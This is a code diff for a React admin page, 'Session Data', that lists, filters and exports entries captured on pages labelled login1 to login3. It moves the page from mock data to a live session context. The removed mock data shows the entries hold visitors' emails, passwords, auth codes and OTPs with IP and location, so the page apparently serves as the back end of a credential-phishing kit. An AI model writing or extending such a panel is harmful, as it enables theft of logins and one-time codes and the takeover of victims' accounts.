@@ -1,5 +1,5 @@
 
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
 import { Input } from '@/components/ui/input';
 import { Button } from '@/components/ui/button';
@@ -14,93 +14,31 @@ import {
   TableRow,
 } from "@/components/ui/table";
 import { Database, Download, Filter, Search } from 'lucide-react';
-
-// Mock data for the component
-const mockSessionData = [
-  {
-    sessionId: 'ses_123456',
-    pageType: 'login1',
-    userId: 'user1',
-    userEmail: 'user@example.com',
-    entries: [
-      {
-        id: 'entry1',
-        timestamp: '2023-05-01T12:30:00Z',
-        ipAddress: '192.168.1.1',
-        location: 'New York, USA',
-        data: { email: 'visitor1@example.com', password: '********' }
-      },
-      {
-        id: 'entry2',
-        timestamp: '2023-05-01T14:45:00Z',
-        ipAddress: '192.168.1.2',
-        location: 'Los Angeles, USA',
-        data: { email: 'visitor2@example.com', password: '********' }
-      }
-    ]
-  },
-  {
-    sessionId: 'ses_789012',
-    pageType: 'login2',
-    userId: 'user2',
-    userEmail: 'user2@example.com',
-    entries: [
-      {
-        id: 'entry3',
-        timestamp: '2023-05-02T09:15:00Z',
-        ipAddress: '192.168.1.3',
-        location: 'London, UK',
-        data: { auth_code: '123456' }
-      }
-    ]
-  },
-  {
-    sessionId: 'ses_345678',
-    pageType: 'login3',
-    userId: 'user1',
-    userEmail: 'user@example.com',
-    entries: [
-      {
-        id: 'entry4',
-        timestamp: '2023-05-03T16:20:00Z',
-        ipAddress: '192.168.1.4',
-        location: 'Toronto, Canada',
-        data: { otp: '987654' }
-      },
-      {
-        id: 'entry5',
-        timestamp: '2023-05-03T18:10:00Z',
-        ipAddress: '192.168.1.5',
-        location: 'Sydney, Australia',
-        data: { otp: '456789' }
-      },
-      {
-        id: 'entry6',
-        timestamp: '2023-05-03T21:05:00Z',
-        ipAddress: '192.168.1.6',
-        location: 'Tokyo, Japan',
-        data: { otp: '135790' }
-      }
-    ]
-  }
-];
+import { useSessionContext } from '@/contexts/SessionContext';
+import { toast } from '@/hooks/use-toast';
 
 const AdminData = () => {
+  const { sessions, exportSessionData } = useSessionContext();
+  
   const [searchQuery, setSearchQuery] = useState('');
   const [pageTypeFilter, setPageTypeFilter] = useState('');
   const [userFilter, setUserFilter] = useState('');
-  const [filteredData, setFilteredData] = useState(mockSessionData);
+  const [filteredData, setFilteredData] = useState(sessions);
+  
+  // Update filtered data when sessions change
+  useEffect(() => {
+    setFilteredData(sessions);
+  }, [sessions]);
 
   const applyFilters = () => {
-    let filtered = mockSessionData;
+    let filtered = sessions;
     
     if (searchQuery) {
+      const query = searchQuery.toLowerCase();
       filtered = filtered.filter(session => 
-        session.sessionId.includes(searchQuery) || 
-        session.entries.some(entry => 
-          entry.ipAddress.includes(searchQuery) || 
-          entry.location.includes(searchQuery) ||
-          JSON.stringify(entry.data).includes(searchQuery)
+        session.id.toLowerCase().includes(query) || 
+        session.data.some(entry => 
+          JSON.stringify(entry).toLowerCase().includes(query)
         )
       );
     }
@@ -110,37 +48,52 @@ const AdminData = () => {
     }
     
     if (userFilter) {
-      filtered = filtered.filter(session => session.userId === userFilter);
+      filtered = filtered.filter(session => session.id === userFilter);
     }
     
     setFilteredData(filtered);
+    
+    toast({
+      title: "Filters Applied",
+      description: `Showing ${filtered.length} results`
+    });
   };
 
   const resetFilters = () => {
     setSearchQuery('');
     setPageTypeFilter('');
     setUserFilter('');
-    setFilteredData(mockSessionData);
+    setFilteredData(sessions);
+    
+    toast({
+      title: "Filters Reset",
+      description: "Showing all sessions"
+    });
   };
 
-  const exportData = () => {
+  const exportAllData = () => {
     const dataStr = `data:text/json;charset=utf-8,${encodeURIComponent(
       JSON.stringify(filteredData, null, 2)
     )}`;
     const downloadAnchorNode = document.createElement('a');
     downloadAnchorNode.setAttribute('href', dataStr);
-    downloadAnchorNode.setAttribute('download', 'session_data.json');
+    downloadAnchorNode.setAttribute('download', 'all_session_data.json');
     document.body.appendChild(downloadAnchorNode);
     downloadAnchorNode.click();
     downloadAnchorNode.remove();
+    
+    toast({
+      title: "Data Exported",
+      description: `Exported ${filteredData.length} sessions`
+    });
   };
 
   const getUniquePageTypes = () => {
-    return Array.from(new Set(mockSessionData.map(session => session.pageType)));
+    return Array.from(new Set(sessions.map(session => session.pageType))).filter(Boolean);
   };
 
   const getUniqueUsers = () => {
-    return Array.from(new Set(mockSessionData.map(session => session.userId)));
+    return Array.from(new Set(sessions.map(session => session.id)));
   };
 
   const formatTimestamp = (timestamp: string) => {
@@ -154,7 +107,7 @@ const AdminData = () => {
           <h1 className="text-3xl font-bold">Session Data</h1>
           <p className="text-muted-foreground">View and export collected session data</p>
         </div>
-        <Button onClick={exportData}>
+        <Button onClick={exportAllData}>
           <Download className="mr-2 h-4 w-4" /> Export All Data
         </Button>
       </div>
@@ -189,23 +142,23 @@ const AdminData = () => {
                 </SelectTrigger>
                 <SelectContent>
                   <SelectItem value="">All Page Types</SelectItem>
-                  {getUniquePageTypes().map(pageType => (
-                    <SelectItem key={pageType} value={pageType}>{pageType}</SelectItem>
+                  {getUniquePageTypes().map((pageType) => (
+                    <SelectItem key={pageType} value={pageType || ""}>{pageType || "Unknown"}</SelectItem>
                   ))}
                 </SelectContent>
               </Select>
             </div>
             
             <div>
-              <Label htmlFor="user">User</Label>
+              <Label htmlFor="user">Session</Label>
               <Select value={userFilter} onValueChange={setUserFilter}>
                 <SelectTrigger id="user" className="mt-1">
-                  <SelectValue placeholder="All Users" />
+                  <SelectValue placeholder="All Sessions" />
                 </SelectTrigger>
                 <SelectContent>
-                  <SelectItem value="">All Users</SelectItem>
-                  {getUniqueUsers().map(userId => (
-                    <SelectItem key={userId} value={userId}>{userId}</SelectItem>
+                  <SelectItem value="">All Sessions</SelectItem>
+                  {getUniqueUsers().map(sessionId => (
+                    <SelectItem key={sessionId} value={sessionId}>{sessionId}</SelectItem>
                   ))}
                 </SelectContent>
               </Select>
@@ -237,33 +190,23 @@ const AdminData = () => {
       ) : (
         <div>
           {filteredData.map(session => (
-            <Card key={session.sessionId} className="mb-6">
+            <Card key={session.id} className="mb-6 hover:bg-accent/5">
               <CardHeader className="pb-3">
                 <div className="flex justify-between items-center">
-                  <CardTitle>Session: {session.sessionId}</CardTitle>
-                  <Button variant="outline" size="sm" onClick={() => {
-                    const dataStr = `data:text/json;charset=utf-8,${encodeURIComponent(
-                      JSON.stringify(session, null, 2)
-                    )}`;
-                    const downloadAnchorNode = document.createElement('a');
-                    downloadAnchorNode.setAttribute('href', dataStr);
-                    downloadAnchorNode.setAttribute('download', `${session.sessionId}.json`);
-                    document.body.appendChild(downloadAnchorNode);
-                    downloadAnchorNode.click();
-                    downloadAnchorNode.remove();
-                  }}>
+                  <CardTitle>Session: {session.id}</CardTitle>
+                  <Button variant="outline" size="sm" onClick={() => exportSessionData(session.id)}>
                     <Download className="mr-2 h-4 w-4" /> Export Session
                   </Button>
                 </div>
                 <div className="flex flex-wrap gap-6 text-sm text-muted-foreground mt-2">
                   <div>
-                    <span className="font-medium">Page Type:</span> {session.pageType}
+                    <span className="font-medium">Page Type:</span> {session.pageType || "Unknown"}
                   </div>
                   <div>
-                    <span className="font-medium">User:</span> {session.userEmail}
+                    <span className="font-medium">Created:</span> {new Date(session.createdAt).toLocaleString()}
                   </div>
                   <div>
-                    <span className="font-medium">Entries:</span> {session.entries.length}
+                    <span className="font-medium">Entries:</span> {session.data.length}
                   </div>
                 </div>
               </CardHeader>
@@ -278,14 +221,14 @@ const AdminData = () => {
                     </TableRow>
                   </TableHeader>
                   <TableBody>
-                    {session.entries.map(entry => (
-                      <TableRow key={entry.id}>
+                    {session.data.map((entry, index) => (
+                      <TableRow key={`${session.id}-entry-${index}`}>
                         <TableCell>{formatTimestamp(entry.timestamp)}</TableCell>
-                        <TableCell>{entry.ipAddress}</TableCell>
+                        <TableCell>{entry.ip}</TableCell>
                         <TableCell>{entry.location}</TableCell>
                         <TableCell>
                           <pre className="text-xs p-2 bg-secondary rounded-md overflow-x-auto">
-                            {JSON.stringify(entry.data, null, 2)}
+                            {JSON.stringify(entry.formData, null, 2)}
                           </pre>
                         </TableCell>
                       </TableRow>
